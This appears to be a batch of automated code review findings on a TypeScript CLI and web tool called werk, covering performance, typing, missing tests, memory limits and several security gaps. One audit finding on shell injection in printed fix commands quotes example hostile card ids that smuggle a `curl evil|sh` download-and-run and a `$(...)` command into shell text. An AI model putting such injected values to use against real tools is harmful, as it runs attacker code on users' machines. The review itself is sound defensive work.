review.fix: Extract a small pure helper, for example `splitLines(buffer, chunk) => { lines, rest }`, into a shared module. Use it in both places and add the module to PURE_FILES.

review.impact: `sendTurn` repeats the `isRunning` check that `holdChild` already does inside. It then casts the result of `live.children.get` and of `holdChild` to `ChildProcessWithoutNullStreams` twice. These casts hide the fact that `holdChild` returns a plain `ChildProcess`, whose stdio can be null.
review.fix: Have `holdChild` report whether it started a new child, for example by returning `{ child, started }` or by taking an `onStart(child)` callback, and attach the listeners there. Or add a typed `holdPipedChild` variant so that one place holds the cast.

review.impact: The `expect(reuse[0]).toBeDefined()` and `toMatch(/reusing the live server .../)` checks on the next line repeat what the `waitFor(REUSE)` line already shows. They add noise and give a second place to update when the message changes.
review.fix: Keep one assertion. Extend `REUSE` to include `; not listening again`, or assert the full line once, and delete the redundant `expect`.

review.impact: One line goes far past the ~95-column wrap that the rest of the README uses (`...(else 403). A page on another origin cannot start the agent. The fake agent in tests answers each`). This makes later diffs harder to read.
review.fix: Rewrap the paragraph to the file's line width.

review.impact: No test covers how the relay buffers a stdout line that arrives in two chunks, or how it wraps a stdout line that is not JSON as {type:'text'}. The fake agent writes each event as one whole line. So a regression in the `buffered`/`lines.pop()` logic passes every test, and the regression drops or corrupts agent events.
review.fix: Add a WERK_FAKE_SCRIPT step, or a small fake, that writes one JSON event in two writes with a sleep between them, and also writes one non-JSON line. Assert that the live channel gets one `agent` event with the parsed object, and one `agent` event of `{type:'text', text:<line>}`.

review.impact: The test 'every turn goes to the one stream-json agent child' compares only the returned pids and the calls file. It never checks that the second turn was written to the agent's stdin and got an answer. If sendTurn returns the reused child but skips the stdin write, this test still passes.
review.fix: Open the live channel before the two POSTs. Then wait for the `"result":"one"` and `"result":"two"` agent events, as the `chat` helper in hot.test.ts does.

review.impact: No test covers the restart branch: the chat child exits, and the next turn starts a new child. A regression where a dead child stays in the map, or where a turn goes to a closed stdin, is not caught.
review.fix: Add a test that kills the chat child's pid, or uses a script that exits, then waits until `children` is empty. Then send a turn and assert a new pid and two lines in WERK_FAKE_CALLS.

review.impact: `expect(reuse[0]).toBeDefined()` cannot fail, because `waitFor` already resolved with a match. The assertion adds nothing.
review.fix: Assert that the captured port and pid equal `server.port` and `serverPid`: `expect(Number(reuse[1])).toBe(server.port); expect(Number(reuse[2])).toBe(serverPid)`.

review.impact: readBody collects the whole request body with no size limit, and it does so before the text check. Any local process can send a very large POST /api/chat body and make the server use all its memory. The Host, Origin and Content-Type checks do not stop a local non-browser client.
review.fix: Set a maximum body size, for example 1 MiB. Count the bytes in the chunk loop. When the count exceeds the limit, destroy the request and return 413.

review.impact: The new Host check is in the request handler only. Vite's HMR WebSocket is attached to the same http server through hmr.server, and it handles 'upgrade' events, so WebSocket upgrades do not go through this check. The 'DNS rebinding is refused with 403' guarantee therefore does not cover the WebSocket. The HMR channel sends only module-update messages, so the exposure is small. But the README and the test say that all requests get the check.
review.fix: Add an 'upgrade' listener on the server in boot(). The listener must destroy the socket when isLocalHost(req.headers.host, port) is false. Alternatively, set Vite's server.allowedHosts to ['localhost', '127.0.0.1'] and add a test that a WebSocket upgrade with a foreign Host is refused.

review.impact: `readBody` reads the whole request body into one string and sets no size limit. A large POST to `/api/chat` grows server memory without bound before `JSON.parse` runs. Only local callers can reach the endpoint, so the risk is low.
review.fix: Count the bytes as chunks arrive. When the total passes a small cap (for example 1 MB), stop reading and answer 413.

review.impact: Each stdout chunk is appended to `buffered`, and then the whole buffer is split again. A long stream-json line with no newline, such as a large tool result, is copied and scanned again on every chunk. The cost grows with the square of the line length.
review.fix: Search for '\n' only in the new chunk (`chunk.indexOf('\n')`). Keep the partial pieces in an array and join them once when a newline arrives. Do not re-split the full accumulated string on every chunk.

review.impact: `sseEvent('agent', event)` runs once for each client inside the loop. With N open live channels, every agent line is serialized N times.
review.fix: Build the frame once before the loop: `const frame = sseEvent('agent', event); for (const client of live.clients) client.write(frame)`.

grade.gap: The diff covers the full contract. `werk decide` and `werk status <id> decided` run four facts through `contractCheck` in `v0/src/map/contract.ts`: who, basis, options for a `you` card, and kill. A failure appends nothing, exits 1, and prints one fix command per missing fact (`v0/src/cli.test.ts`, 'a decide with a missing fact exits 1...'). An amend of a decided card runs the facts again. A reopen is not checked, and neither is the card text. All 166 tests pass. `appendEvent` in `v0/src/map/log.ts` is the only write path, so no route skips the check. One small gap: the kill fact and the who fact have no recorded escape hatch. `basis` has `--no-basis` and `options` has `--unchallenged`, but `missingFacts` gives no waiver form for kill or who. Either add a written-reason waiver for kill, or state in the kill reason text that `werk kill <id> "<reason no criterion applies>"` is the escape hatch.

The check runs at the state change, not at creation (contract.test.ts, 'creation, a reopen, a record and an excerpt are not checked'). Every failure prints the exact fix command, and the tests run each printed command to confirm it. #pr-gate requires that every rule has an escape hatch with a written reason. Basis (`edit --no-basis <reason>`) and options (`edit --unchallenged <reason>`) have one. Kill (`v0/src/map/contract.ts` `missingFacts`, the `card.kill.length === 0` branch) and who have none. Give the kill rule a waiver that records its reason, or name the reason form in the kill refusal text. Who is a value with three choices, so it needs no waiver.

review.impact: The pure map layer now hardcodes the command-line syntax: verb names, flag spellings such as `--who`, `--alternative-to` and `--no-basis`, and the `werk` binary name. These strings duplicate the flag tables in `args.ts`. If a flag is renamed in `args.ts`, the fix commands drift without a type error. A test that parses the printed fixes catches this, but only for the cases that the test builds. The map module also now knows the CLI, so another write path, such as a browser ✓ action, would show shell commands to a user who is not in a shell.
review.fix: Make `missingFacts` return structured data: the fact, the card id, and the next option id. Build the command text in the CLI layer, next to `args.ts`, from the same flag constants that the parser uses. `log.ts` or `cli.ts` then formats the refusal.

review.impact: `contractCheck` folds the event again and compares `problems.length` to find out whether the fold would refuse the event. `appendEvent` already runs `check()` first and stops early with `??`. The guard is therefore dead code on the real path, and it creates a hidden order dependency between the two checks. It also uses an `as LogEvent` cast with a fake `at: ''`.
review.fix: Call `check(state, event)` directly in `contractCheck`, or document that the caller must run `check` first and remove the guard. Either way, keep one place that decides whether the fold accepts an event.

review.impact: `update(event.id, { [event.fact]: event.value })` uses a computed key, so TypeScript widens the type. This writes an unchecked `string` into `Card.who`, which is typed as `Who`. Type safety depends only on the runtime check in `check()`. A new `RecordedFact` that does not match a `Card` property name would also compile without an error.
review.fix: Switch on `event.fact` and assign each field explicitly (`who: event.value as Who`, `noBasis`, `unchallenged`), or use a typed map from `RecordedFact` to a `Card` key.

review.impact: The `edit` error message hard-codes the six flag names. `FIELD_FLAGS` and `FACT_FLAGS` already hold the same list. The next flag added to either map leaves the message wrong, and nothing catches it.
review.fix: Build the message from the maps: `` `edit: give exactly one of ${[...Object.keys(FIELD_FLAGS), ...Object.keys(FACT_FLAGS)].map((f) => `--${f}`).join(', ')}` ``. Reuse the same array for `flags`.

review.impact: The fold has two checks for a bad `who`, and they give two different messages. On `added` it says `unknown who: them`. On `recorded` it says `who is one of you, me, prototype, got them`. `args.ts` has a third copy in `badWho`. The same rule now lives in three places with two wordings.
review.fix: Add one helper in `events.ts`, such as `whoProblem(value)`, that returns the single message. Call it from both branches of `check`. `badWho` in `args.ts` can then add only its verb prefix.

review.impact: `amendOf` decides which card an event amends with a ternary chain five levels deep. Each branch also decides `frozen`, so a reader must follow every branch to check the frozen rule. The `removed` branch can give an undefined id, and only the line after the chain handles that case.
review.fix: Use a `switch (event.type)` that returns `{ id, frozen }` or `undefined` from each case. This matches the `switch` style that `applyEvent` and `check` in `fold.ts` use.

review.impact: `runFix` hard-codes the placeholder strings `<you|me|prototype>` and `<card-it-needs>`. `contract.test.ts` line 52 repeats the same replacements. Both copies must stay in step with the fix texts in `contract.ts`. A renamed placeholder breaks the tests far from its cause.
review.fix: Export the placeholder tokens from `contract.ts`, or add one shared test helper `fillPlaceholders(fix, card)` in `test/`. Use it from both test files.

review.impact: A basis that is decided and has only a `review` mark is not tested. The code reports it as 'stale' even though the mark is a review mark. A change to the `marked` predicate or to the reason text can break this case, and no test fails.
review.fix: Add a test with a decided basis that has a review mark but no stale mark. Assert that the card waits on the basis, and assert the exact reason text.

review.impact: Only `retitled` is tested as a frozen amend on a card decided before the contract. No test covers the other frozen events: an `edited` field, a `linked` refines, or a `linked` depends_on that keeps the basis. If `amendOf` lost the `edited` branch or the `refines` branch, no test would fail. The line coverage stays at 100% because one ternary expression covers all the branches.
review.fix: Add a table test over the legacy decided card for `edited` (body), `linked` refines and `linked` depends_on. Assert that each one is refused with 'the change to #a is refused'.

review.impact: Each refusal prints fix commands that are meant to be copied and run in a shell, by a person or by an agent. These commands put card ids into the text without quotes or escaping: `werk edit ${id} ...`, `werk kill ${id} ...`, `werk status ${waiting.id} decided`, and `--why "<what #${id} takes from it>"`. No code checks the characters in a card id. A `.werk/log.jsonl` can be committed to a repository and come from someone else. A card id in it such as `x;curl evil|sh` or `x$(touch pwned)` then becomes shell code in the printed fix. `$(...)` also runs inside the double-quoted `--why` placeholder. The basis fix can name a parent card or a depends_on target. So the id in the fix can belong to a different card than the one the user asked to decide.
review.fix: Check card ids when an `added` event is read, in the fold's `check`, for example with `/^[A-Za-z0-9][A-Za-z0-9:_-]*$/`. The fold then rejects a bad id in the log or on the command line. Another fix is to shell-quote every id that goes into a fix string. Use single quotes, and escape any single quote in the id. Do this also for the id inside the double-quoted `--why` placeholder.

grade.gap: The postponed reopen spreads `paused` along the reverse depends_on and refines closure, which v0/src/map/marks.ts markPaused tests in marks.test.ts. A postponed card stays open, as the card requires. The diff has no rollup that shows the postponed share inside each status band, so no bar shows a postponed subtree. The card points to a rollup with openPaused, protoPaused and decidedPaused. If v0 has a rollup or a status bar, count `paused` cards there separately, and add a test. If v0 has neither, nothing is missing.

Next-hop stale marks are implemented and tested in v0/src/map/marks.test.ts. A confirm stops the mark. An amend moves it one hop. A later link carries no mark. A postponement pauses cards at any distance. The diff does not implement or test the card's rule "a card whose basis is stale waits; it is not stale" (#map-wait). listMarked in v0/src/map/view.ts puts basis cards first, but no card gets a `waiting` state, and MARK_KINDS has no waiting kind. Add a derived waiting state to the views for a card whose depends_on target is stale, or confirm that #map-wait is out of scope for this build.

review.impact: `check` now refuses a `reopened` event that has no `reason`. `applyEvent` runs `check` on every event it reads from the log, not only on events it appends. A v0 log that already holds a reopen in the old shape folds that line into `problems`. The card then stays `decided`, and the stale marks from that reopen disappear. The CLI reports this only as an entry in `show`'s `problems`, and the page does not show it. The rule protects the append path, but it changes how existing history reads.
review.fix: Keep the new rule on the append path. In `applyEvent`, read an old `reopened` event that has no `reason` as `rejected`, which matches the old 'mark the next hop stale' meaning. Do this with a small normalisation step in `fold` or `readLog`, and add a test that folds an old-shape reopen.

review.impact: `marks.ts` imports the `Card` and `Link` types from `fold.ts`. `fold.ts` imports functions from `marks.ts` and re-exports `Mark`. This makes an import cycle between the two modules. The cycle is type-only now. If a later value import closes it, module load order can break, and the boundary 'marks is a leaf that fold calls' is not stated.
review.fix: Move `Card`, `Link` and `Mark` into a types-only module, or into `events.ts`. Then `marks.ts` does not depend on `fold.ts`. Remove the `export type { Mark }` re-export from `fold.ts` and import `Mark` from its own module.

review.impact: The stale and paused parts of the detail now render through `Traces`/`describeChange`, with date, reason and path. The 'needs review' part still uses its own inline JSX, so review marks show a different trace format. Review marks now carry `at` and `change` too. The CLI `stale --kind review` prints those through `describeMark`, so the browser and the CLI give different traces for the same mark.
review.fix: Render the review part with `<Traces marks={card.review} />` in the same section shape as stale and paused. For example, loop over `['stale', 'paused', 'review']` and use one heading per kind.

review.impact: `reopened()` casts `flags.reason` to `ReopenReason` before it validates the value. `stale` does the same with `--kind as MarkKind`. The cast hides from the compiler that the value is an unchecked string.
review.fix: Narrow with a type guard, for example `const isReason = (s: string): s is ReopenReason => (REOPEN_REASONS as readonly string[]).includes(s)`. Do the same for `MarkKind`. Then you can drop the casts.

review.impact: The `werk()` helper is a copy of the helper in `e2e/live.e2e.ts:7`. It has the same spawnSync call and the same error handling. A change to how e2e tests run the CLI, such as the runtime, env or cwd, must now be made in two places. Each copy can drift on its own.
review.fix: Move `werk(port, ...args)` to `e2e/fixture.ts`, next to `fixtureProject`, and import it from both spec files.

review.impact: `.mark.stale { color: #c0392b; opacity: 1 }` repeats the color that `.mark` already sets two rules above. This makes `.mark.stale` look different from `.mark` when it only changes the opacity. The red value is now in two rules.
review.fix: Reduce the rule to `.mark.stale { opacity: 1; }`. You can also move the red color off the plain `.mark` rule onto `.mark.stale`, so each mark kind owns its color.

review.impact: The stale and paused sections build a `<section className="part ...">` with an `<h2>` and a list by hand. The `Part` component already does this. There are now two section patterns in one file. The review section still uses `Part` and its own `<li>` text, while stale and paused use `Traces`.
review.fix: Let `Part` take an optional `className` and a heading, or let it render `Traces` directly. Then use `Part` for stale, paused and review.

review.impact: `flags.reason as ReopenReason` casts the value before it is validated. The same pattern appears at `args.ts` line 143 (`flags.kind as MarkKind | undefined`). Each cast hides an unchecked string behind a narrow type. A later edit that uses `reason` before the `includes` check type-checks but is wrong.
review.fix: Add a small type guard, for example `isOneOf<T extends string>(list: readonly T[], v: string | undefined): v is T`. Use it in both places so the narrowing comes from the check, not from a cast.

review.impact: The test 'a review of a paused card does not clear the mark' calls `fold` directly with `decide('b')` on a card that is decided and only paused. `fold` does not run `check`, so the test skips validation. In the real write path, `check` refuses this decide with '#b is already decided', because the 'already decided' rule looks only at `stale` and `review` and ignores `paused`. So the test passes on a state that a user cannot reach, and nothing tests what a user actually sees when they try to review a paused card.
review.fix: Assert the real contract. Either add a `check(state, decide('b'))` assertion that expects '#b is already decided' (and rename the test), or build the state through the append path the CLI uses. If a review of a paused card should be allowed, change `check` and test that change.

review.impact: `status decided` now refuses any flag, because the code tests `Object.keys(flags).length`, and the error message names `--reason`. The tests cover only `--why`. A change back to checking only `flags.why` would pass every test and would accept `status a decided --reason rejected` without a word.
review.fix: Add `expect(write('status', 'a', 'decided', '--reason', 'rejected')).toEqual({ kind: 'error', message: 'status: decided takes no --reason or --why' })`.

review.impact: A `reopened` event that is already in a log and has no `reason` (the earlier event shape) skips `check` when the log is read. It goes to the `else` branch and is drawn as a rejected stale mark. No test covers how a reason-less reopen in an existing log folds, so a change to this fallback goes unseen.
review.fix: Add a fold test with `{ type: 'reopened', id, why } as unknown as EventBody` already in the log. Assert the mark it produces (stale, with `reason` undefined) and how `describeChange` renders it.

review.impact: The new reason check also runs on events already in the log. A project log written before this change has `reopened` events with no `reason`. On the next fold, the fold refuses each of those events. The card then stays `decided` and its dependents lose their marks, and nothing tells the user why. Bad input is still refused safely, so this is not a security hole. The problem is that valid old data now fails the new validation.
review.fix: Read a stored `reopened` event that has no `reason` as `rejected`. That is the old meaning: it marked the next hop stale. Do this in the log reader or in the fold, and keep the strict check for new writes in `args.ts` and `appendEvent`. Add a test that folds an old-format reopen event.

review.impact: `werk stale` prints `card.title`, `mark.why` and the card ids to the terminal as raw text. Before this change, `show` printed through `JSON.stringify`, which escapes control characters. A title or `--why` text that holds ANSI escape sequences or a newline can now change the terminal or fake extra lines in the listing. The log is local and only the user or an agent writes to it, so the risk is small.
review.fix: Before `stale` prints the free-text fields, remove C0/C1 control characters from them or escape them, for example with `s.replace(/[\u0000-\u001f\u007f-\u009f]/g, ' ')`. Or refuse control characters in `--title` and `--why` when `args.ts` parses them.

review.impact: `listMarked` runs on every render of the root page, and once for each `werk stale` call. Its `visit` step scans all links for every card, which costs O(N·L). Each card also calls `isVisible` and `inScope`, and both call `ancestors`. `ancestors` scans the links once per level of depth. The total cost is O(N·L·depth), and most cards in the map have no mark. A map with 1,000 cards and 3,000 links does about 10 million link checks each time the live channel sends `changed`.
review.fix: Build a `Map<from, Link[]>` of the outgoing `depends_on` and `refines` links one time, and let `visit` read that map. Compute visibility and the ancestor chain one time per card and keep the result. Alternatively, collect only the marked cards first, then sort that small set by depth in the graph. Then wrap the call in `CardPage` in `useMemo` keyed on `map`.

review.impact: `markPaused` calls `downstream` for each card that the walk reaches, and each call filters every link. One postponed reopen therefore costs O(N·L) inside the fold. The fold replays the whole log on every read and every server change, so this cost repeats for each postponed reopen in the log. `queue.shift()` adds O(n) per dequeue as well.
review.fix: At the start of `markPaused`, build one index from target id to incoming `refines`/`depends_on` links. Walk the queue with an index pointer, not with `shift()`.

causeOfLast.why: werk/03 (the decide contract) merged after werk/05 was built and changed the same lines in `events.ts`, `fold.ts` and `args.ts`.

grade.gap: The diff adds no rollup. Nothing counts a postponed card in `open` with its paused portion shown per status band (openPaused/protoPaused/decidedPaused). Nothing shows a subtree that holds a postponed card as not drained. If v0 has no rollup view yet, this gap does not apply. The rest is correct: `markPaused` in v0/src/map/marks.ts walks the whole closure, and the never-case is `rejected` (v0/src/map/events.ts REOPEN_REASONS).

`markPaused` in v0/src/map/marks.ts walks refines at any depth. #vi-edges says refines carries a change one level down. #pr-wf-paused allows this for paused marks, but no comment or test names the exception for refines. marks.test.ts covers only the one-hop k-refines-a case, and CardPage.test 'a paused card in a list' covers r, two levels down. Add a test that says refines carries a paused mark past one level, and a test that a rejected reopen does not.

Old logs have `reopened` events with no `reason`. `applyEvent` in v0/src/map/fold.ts folds them as rejected through the `else markStale` branch. No test pins this. Also, no test proves that a log written before this change still folds when a later append runs `check`. Add a fold test that a legacy `reopened` event without `reason` folds as stale and does not throw.

review.impact: The fold and the append both run `check`, so the new rule also covers events that are already in the log. A log written before this change holds `reopened` events with no `reason`. When the log is read again, each of those reopens becomes a problem and is skipped. The card then shows as decided, and the cards downstream lose their marks. This is a silent change to the history, and the append-only log (#pr-log) must not allow it.
review.fix: Refuse a missing reason only when a new event is appended, in `appendEvent` or in the argument parsing. In the fold, read an old reopen that has no reason as `rejected`, which was the behaviour before this change. Add a test that folds an old reopen with no reason.

review.impact: Paused marks go away only when the postponed card is decided again. A review of a paused card does not clear them. Suppose a postponed card is removed, or its parent is removed. The paused marks on every card downstream then stay with no end. They point at a card that is not in view, and the map gives no visible way to resume it. The staleness listing keeps those cards as paused.
review.fix: When a card is removed, resume its paused marks: call `resume(next.cards, event.id)` in the `removed` case. Do the same for the cards in its refines subtree. Or make `listMarked` and `markOf` ignore a paused mark whose `because` card is not visible. Add a test for each case.

review.impact: A card can both refine and depend_on the same card, because the link rules allow it. A change to that card then puts two marks with the same `because` and `seq` on the card, one for each link. `Traces` builds the key `${mark.because} ${mark.seq}`, so React gets two equal keys. React logs a warning and can reuse the wrong row when the list updates.
review.fix: Add `mark.via` to the key: `${mark.because} ${mark.seq} ${mark.via}`.

review.impact: `marks.ts` imports `Card` and `Link` from `fold.ts`, and `fold.ts` imports the mark functions from `marks.ts` and re-exports `Mark`. The two modules depend on each other. The import is type-only now, so it works. But a value import added later in either direction makes a runtime import cycle, and the module order is then not certain.
review.fix: Move `Card`, `Link` and `Mark` into a small types module, or into `events.ts`. Let both `fold.ts` and `marks.ts` import from that module. Then remove the re-export from `fold.ts`.

review.impact: The `export type { Mark } from './marks.ts'` re-export has no importer. Every consumer imports `Mark` from `marks.ts`. The re-export is dead code and gives `Mark` a second import path that can drift.
review.fix: Delete the re-export line.

review.impact: `.mark.stale` sets the same `#c0392b` colour that `.mark` already sets. Its `opacity: 1` is the default value and overrides nothing. The red colour is now defined in two places.
review.fix: Remove the `.mark.stale` rule. If a separate stale selector is wanted, keep one colour declaration only.

review.impact: `flags.reason as ReopenReason` and `parsed.flags.kind as MarkKind` (line 159) cast an unchecked string to a union type before validation. Each site also repeats its own 'is one of …, got …' message. The casts hide the real type from the compiler, and the duplicate check is easy to copy wrongly at the next enum flag.
review.fix: Add one type-guard helper, for example `oneOf<T extends string>(values: readonly T[], v: string | undefined): v is T`, plus a shared message builder. Use them in `reopened` and in the `stale` branch instead of the casts.

review.impact: The `retitled`, `edited`, `reopened` and `disputed` cases each build the same `{ id: event.id, seq: event.seq, at: event.at, change: … }` object by hand. When `ChangeEvent` gets a new field, four sites must change in step.
review.fix: Add a small helper such as `changeOf(event, change, extra?)` that builds the `ChangeEvent` from a `LogEvent`, and call it in each case.

review.impact: The 'needs review' section still renders review marks with its own inline markup. The stale and paused sections now use the shared `Traces` component and `describeChange`. Review marks carry the same `Mark` shape, so the same trace exists in two renderings and can diverge.
review.fix: Render review marks through `Traces`, or through `describeChange`, the same way as the stale and paused sections.

review.impact: The assertion changed from toEqual to toMatchObject. It no longer fails if the mark gains an unexpected field, for example a `reason` or `why` on a retitle mark, or if `at` is missing.
review.fix: Use toEqual with `at: expect.any(String)` so that the whole mark shape stays pinned.

review.impact: The `status decided` refusal now uses Object.keys(flags) so that it also rejects --reason. Only the --why case is tested. If the check goes back to `flags.why === undefined`, `status a decided --reason postponed` silently becomes a decide and no test fails.
review.fix: Add `expect(write('status', 'a', 'decided', '--reason', 'postponed')).toEqual({ kind: 'error', message: 'status: decided takes no --reason or --why' })`.

review.impact: The `seen` set in markPaused stops a diamond (two paths to one card) from giving the card two paused marks. The doc comment also says the path is a shortest one. Only a two-card cycle tests this. A regression that marks a card once per path, or records a longer path, passes the tests.
review.fix: Add a diamond test: b and c depend_on a, d depends_on b and c, and e depends_on d with a direct depends_on a. Then postpone a. Assert that d has exactly one paused mark and that e's mark has `path: []`.

review.impact: MarkBadge removes duplicate reasons and joins several reasons with ', '. Every test case has a single mark, so a badge such as 'stale: rejected, rejected' or a wrong separator is not detected.
review.fix: Add a case where one card has two stale marks, one from a rejected reopen and one from a retitle, plus a second rejected mark. Assert that the badge text is 'stale: rejected, retitled'.

review.impact: The new `stale` command prints card titles and the reopen `why` text from the log to the terminal as raw text. Other `show` output goes through JSON.stringify. A title or why that holds ANSI or other control characters can move the cursor, hide lines, or fake output in the terminal. Only people or agents who can append to the project log can write that text, so the risk is low.
review.fix: Remove or escape C0/C1 control characters in `card.title` and in the text from `describeMark(mark)` before you print them. One way is `.replace(/[\u0000-\u001f\u007f-\u009f]/g, (c) => JSON.stringify(c).slice(1, -1))`. Another way is to refuse control characters in titles and why text when the event is checked.

review.impact: listMarked runs the depends_on/refines walk on every card, and the walk scans all of state.links for each visited card. That costs O(cards × links). Then the function runs isVisible and inScope on every card, not only on marked cards. Each of those calls runs ancestors(), and each ancestor step is a parentOf() scan over all links. The total cost is O(cards × depth × links). The root page in CardPage.tsx:54 calls this on every render, and so on every live `changed` push. The project log has about 7.8k events. With about 1k cards and 2k links, one call does millions of link scans, and the count grows quadratically as the map grows.
review.fix: Build a Map from each card id to its outgoing depends_on/refines links once per call, and walk that map. Filter to cards where marksOf(card, kind) is not empty first. Run isVisible, inScope and the ordering only on those cards and on their upstream closure. In CardPage, wrap the listMarked(map) call in useMemo keyed on map.

review.impact: Every `decided` event now calls resume(), and resume() iterates over all cards in the map. Before this change a decide cost O(1). Now the fold costs O(decides × cards), and the fold runs on every CLI command and every server reload. Almost all of these calls do no useful work. Only a card that is postponed and not yet decided again can own paused marks.
review.fix: Call resume() only when the card's reopen?.reason is 'postponed'. Read that value before the destructure removes reopen.

review.impact: markPaused calls downstream() for each dequeued card, and downstream() filters the full links array. One postponed reopen therefore costs O(reached cards × links). queue.shift() is also O(n) per call. On a large map with a wide downstream set, each postpone event adds a quadratic cost to every fold.
review.fix: Before the BFS (breadth-first search), build an index once from each `to` id to its refines/depends_on links. Use a head index into the queue array instead of shift().

review.impact: The `joins` offsets come from a `reduce` inside a `map` over `slice` copies. The work is quadratic in the number of text blocks, and the reader must work out the arithmetic: the sum of the earlier lengths plus one newline per earlier block.
review.fix: Use one loop with a running offset: `let at = 0; const joins = []; for (const t of texts.slice(0, -1)) { at += t.length; joins.push(at); at += 1 }`.

review.impact: The test writes `span: [0, 7]` twice, in the `as const` object and again in each spread (`{ ...quoted, span: [0, 7] }`). The second copy exists only to remove the readonly tuple type. A reader cannot tell this, and a change to the span must be made in three places.
review.fix: Type the fixture as `Extract<EventBody, { type: 'quoted' }>` and do not use `as const`. Then remove the `span` overrides from both spreads.

review.impact: `describeEvent` is now a five-level nested ternary. Each new event type with a link adds one more level, and the conditions become harder to read and to compare with `eventIds`, which has the same branches.
review.fix: Change it to early returns or a `switch` on `event.type`, in the same order as the branches in `eventIds`.

review.impact: `pageOf` calls `withHeld(state)` two times for one page. Each call builds a new merged array. The `links` default parameter on `into`/`outOf` also hides which link set each field reads.
review.fix: Compute `const all = withHeld(state)` one time at the top of the card branch, and pass `all` to the `evidence` and `supports` calls.

review.impact: `readTranscript` is meant to search the project's own directory first. No test checks this order. A session file can exist in both the project's own directory and an earlier-sorted other directory. If the code reads the other directory first, the quote gets the wrong transcript and every test still passes.
review.fix: Add a test that writes two different transcripts with the same session id: one under the project's own encoded directory, and one under a directory that sorts before it (for example `-a`). Assert that the quote matches text that exists only in the project's own file.

review.impact: The bad-input table checks `msgIndex: -1` but not a fractional index such as `1.5`. The `Number.isInteger` part of the check has no test. If someone simplifies it to `msgIndex < 0`, no test fails.
review.fix: Add `[{ id: 'x', msgIndex: 1.5 }, 'a message index is a whole number from 0, got 1.5']` to the cases. Also add a span whose end is past the end of the text with a correct start, for example `[4, 12]`.

review.impact: readTranscript always reads and sorts the whole `projects` directory, even when the session file is in the project's own directory. The usual case finds the file there, so this directory read is wasted work on every quote. The cost grows with the number of projects under the Claude config dir.
review.fix: First check `join(projects, own, `${session}.jsonl`)` and return it if it exists. Call `readdirSync(projects)` only when that check misses.
